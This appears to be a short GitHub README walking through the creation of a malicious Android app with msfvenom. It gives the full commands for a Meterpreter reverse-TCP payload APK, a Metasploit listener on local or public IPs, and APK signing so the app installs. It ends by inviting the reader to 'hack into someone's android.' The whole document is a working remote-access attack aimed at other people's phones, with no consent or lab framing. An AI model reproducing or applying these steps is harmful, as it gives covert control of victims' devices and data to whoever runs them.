# Metasploitandroid
Set up Metsploit Venom to generate a malicious Android app with a reverse shell

To do this, we need to run some commands on Linux.

1. Generate an .apk using msfvenom
   msfvenom -p android/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=<your_port> -o malicious.apk
   Replace <your_IP> with your local or public IP.
   Public IP will be needed if the person downloading the APK is out of your local network.
   To get your public IP, visit https://whatismyipaddress.com or curl ifconfig.me on linux.
   Replace <your_port> with the port you’ll be listening on, e.g. 4444
With a local IP, the command looks like this: msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o malicious.apk
With a public IP, the command might look like this: msfvenom -p android/meterpreter/reverse_tcp LHOST=45.67.89.123 LPORT=4444 -o malicious.apk. You'll also need to set up port forwarding here.

2. Then, set up the Metasploit listener to listen to the incoming requests.
   - For Local IP set-up:
   msfconsole
   use exploit/multi/handler
   set payload android/meterpreter/reverse_tcp
   set LHOST 192.168.1.100   #this is your local IP address
   set LPORT 4444
   exploit

   - For Public IP set-up:
   msfconsole
   use exploit/multi/handler
   set payload android/meterpreter/reverse_tcp
   set LHOST 0.0.0.0   # this allows all the request from the internet WAN/LAN
   set LPORT 4444
   exploit

3. Sometimes the APK might not install and ask for a signing. This is an added security check by Android, so we need to sign our malicious.apk file as well.
   Usually, it's available with Android Studio in Windows.
   In Linux, you can install apksigner. It comes with the Android SDK. If you don’t have it, install zipalign and apksigner using: sudo apt install apksigner zipalign -y 
   keytool -genkey -v -keystore my-release-key.keystore -alias my-key-alias -keyalg RSA -keysize 2048 -validity 10000
   jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore malicious.apk my-key-alias

4. Once the target installs and opens the APK, you should see a Meterpreter session open in Metasploit:
   meterpreter >
   Now, your reverse shell is good to go, and you can try commands to hack into someone's android.

  


